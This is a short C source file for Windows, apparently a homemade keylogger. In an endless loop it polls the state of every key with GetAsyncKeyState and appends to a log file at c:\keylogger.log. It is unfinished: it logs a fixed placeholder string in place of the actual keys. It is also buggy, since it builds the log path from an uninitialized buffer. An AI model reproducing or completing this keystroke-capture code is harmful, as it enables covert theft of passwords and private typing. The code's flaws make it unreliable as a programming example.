//#define _WIN32_WINNT 0x0500 
#include "includes.h"
#include "extern.h"
#include "defines.h"

void *keylog ()
{
    int x;
    char fPath[512];
	char setLog[2500];
    sprintf(fPath,"%s%s", setLog,"c:\\keylogger.log");
    MessageBox(NULL,fPath,"lol",MB_OK);
    FILE * pFile;
    pFile = fopen(fPath,"a");
    while(1)
    {
        for(x=0;x<256;x++) 
        { 
            if(GetAsyncKeyState(x)) 
            {
                fputs("-Keylogger-:\n",pFile);  //just putting a letter in for testing purposes
                Sleep(100);
                //MessageBox(NULL,"test","lol",MB_OK);

            }//mey own keylog =]

        }
   }
}
